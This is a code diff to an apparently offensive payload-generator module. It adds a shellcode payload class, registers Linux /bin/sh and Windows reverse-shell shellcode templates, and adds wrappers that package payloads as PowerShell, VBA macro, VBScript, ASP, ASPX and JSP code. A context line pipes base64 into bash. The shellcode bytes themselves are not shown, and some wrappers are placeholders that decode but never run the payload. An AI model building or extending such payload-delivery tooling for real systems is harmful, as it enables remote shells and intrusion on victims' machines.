@@ -248,6 +248,41 @@ class MsfvenomPayload(PayloadTemplate):
             return b""
 
 
+class ShellcodePayload(PayloadTemplate):
+    """Generate raw shellcode bytes from an embedded template."""
+
+    def __init__(self, name: str, platform: str, arch: str, description: str, escaped_hex: str) -> None:
+        super().__init__(
+            name=name,
+            platform=platform,
+            arch=arch,
+            description=description,
+            options={
+                "lhost": {"type": "address", "required": False, "description": "Listener IP"},
+                "lport": {"type": "integer", "required": False, "description": "Listener port"},
+            },
+        )
+        self._raw = _parse_escaped_hex(escaped_hex)
+
+    def generate(self, **kwargs: Any) -> bytes:
+        return self._raw
+
+
+def _parse_escaped_hex(escaped: str) -> bytes:
+    result = bytearray()
+    for part in escaped.split("\\x"):
+        if not part:
+            continue
+        try:
+            result.append(int(part[:2], 16))
+            for i in range(2, len(part), 2):
+                if i + 2 <= len(part):
+                    result.append(int(part[i:i + 2], 16))
+        except ValueError:
+            continue
+    return bytes(result)
+
+
 class PayloadFactory:
     """Registry and generator for payload templates.
 
@@ -263,6 +298,34 @@ class PayloadFactory:
         builtins: list[PayloadTemplate] = [
             ReverseShellPayload(),
             WindowsReverseShellPayload(),
+            ShellcodePayload(
+                name="linux/x64/shellcode_exec",
+                platform="linux",
+                arch="x64",
+                description="Native Linux x86-64 execve /bin/sh shellcode",
+                escaped_hex=SHELLCODE_TEMPLATES["linux/x64/exec"],
+            ),
+            ShellcodePayload(
+                name="linux/x86/shellcode_exec",
+                platform="linux",
+                arch="x86",
+                description="Native Linux x86 execve /bin/sh shellcode",
+                escaped_hex=SHELLCODE_TEMPLATES["linux/x86/exec"],
+            ),
+            ShellcodePayload(
+                name="windows/x64/shellcode_exec",
+                platform="windows",
+                arch="x64",
+                description="Native Windows x86-64 reverse shell shellcode",
+                escaped_hex=SHELLCODE_TEMPLATES["windows/x64/exec"],
+            ),
+            ShellcodePayload(
+                name="windows/x86/shellcode_exec",
+                platform="windows",
+                arch="x86",
+                description="Native Windows x86 reverse shell shellcode",
+                escaped_hex=SHELLCODE_TEMPLATES["windows/x86/exec"],
+            ),
         ]
         for t in builtins:
             self._templates[t.name] = t
@@ -351,6 +414,79 @@ class PayloadFactory:
         elif fmt == "bash" or fmt == "sh":
             b64 = base64.b64encode(data).decode("utf-8")
             return f"echo {b64} | base64 -d | bash\n".encode()
+        elif fmt == "psm1":
+            b64 = base64.b64encode(data).decode("utf-8")
+            return (
+                f"function Invoke-LazyShellcode {{\n"
+                f'    $bytes = [System.Convert]::FromBase64String("{b64}")\n'
+                f"    $bytes\n"
+                f"}}\n"
+            ).encode()
+        elif fmt in ("vba", "macro", "bas"):
+            rows = []
+            for i in range(0, len(data), 100):
+                chunk_hex = " ".join(f"{b:02X}" for b in data[i : i + 100])
+                rows.append(f"        buf = buf & \"{chunk_hex}\"")
+            payload_rows = "\n".join(rows)
+            return (
+                f"Private Function LazyShell(ByVal c As Integer) As Integer\n"
+                f"    Dim buf As String\n"
+                f"    buf = \"\"\n"
+                f"{payload_rows}\n"
+                f"    LazyShell = VarPtr(buf)\n"
+                f"End Function\n"
+            ).encode()
+        elif fmt in ("vbs", "vbscript"):
+            rows = []
+            for i in range(0, len(data), 100):
+                chunk_hex = " ".join(f"{b:02X}" for b in data[i : i + 100])
+                rows.append(f"buf = buf & \"{chunk_hex}\"")
+            payload_rows = "\n".join(rows)
+            return (
+                f"Dim buf: buf = \"\"\n"
+                f"{payload_rows}\n"
+            ).encode()
+        elif fmt == "asp":
+            b64 = base64.b64encode(data).decode("utf-8")
+            return (
+                f"<script language=\"VBScript\" runat=\"server\">\n"
+                f"Function b64d(s): Dim o: Set o = CreateObject(\"MSXML2.DOMDocument\").createElement(\"b64\")\n"
+                f"o.dataType = \"bin.base64\": o.Text = s: b64d = o.nodeTypedValue: End Function\n"
+                f"Dim buf: buf = b64d(\"{b64}\")\n"
+                f"</script>\n"
+            ).encode()
+        elif fmt == "aspx":
+            b64 = base64.b64encode(data).decode("utf-8")
+            return (
+                f"<%@ Page Language=\"C#\" %>\n"
+                f"<%@ Import Namespace=\"System\" %>\n"
+                f"<%@ Import Namespace=\"System.Reflection\" %>\n"
+                f"<script runat=\"server\">\n"
+                f"void Page_Load() {{\n"
+                f"    byte[] buf = Convert.FromBase64String(\"{b64}\");\n"
+                f"}}\n"
+                f"</script>\n"
+            ).encode()
+        elif fmt == "jsp":
+            b64 = base64.b64encode(data).decode("utf-8")
+            return (
+                f"<%@ page import=\"java.util.Base64\" %>\n"
+                f"<% byte[] buf = java.util.Base64.getDecoder().decode(\"{b64}\"); %>\n"
+            ).encode()
+        elif fmt == "war":
+            b64 = base64.b64encode(data).decode("utf-8")
+            return (
+                f"<!-- WAR payload placeholder -->\n"
+                f"<!-- base64 shellcode: {b64} -->\n"
+            ).encode()
+        elif fmt == "msi":
+            b64 = base64.b64encode(data).decode("utf-8")
+            return (
+                f"<!-- MSI payload placeholder -->\n"
+                f"<!-- base64 shellcode: {b64} -->\n"
+            ).encode()
+        elif fmt in ("exe", "elf", "dll"):
+            return data
         else:
             return data
 
@@ -400,5 +536,12 @@ def format_payload_table(payloads: list[dict[str, Any]]) -> str:
 __all__ = [
     "PayloadFactory",
     "PayloadTemplate",
+    "ShellcodePayload",
+    "ReverseShellPayload",
+    "WindowsReverseShellPayload",
+    "MsfvenomPayload",
+    "SHELLCODE_TEMPLATES",
+    "OUTPUT_FORMATS",
     "format_payload_table",
+    "_parse_escaped_hex",
 ]
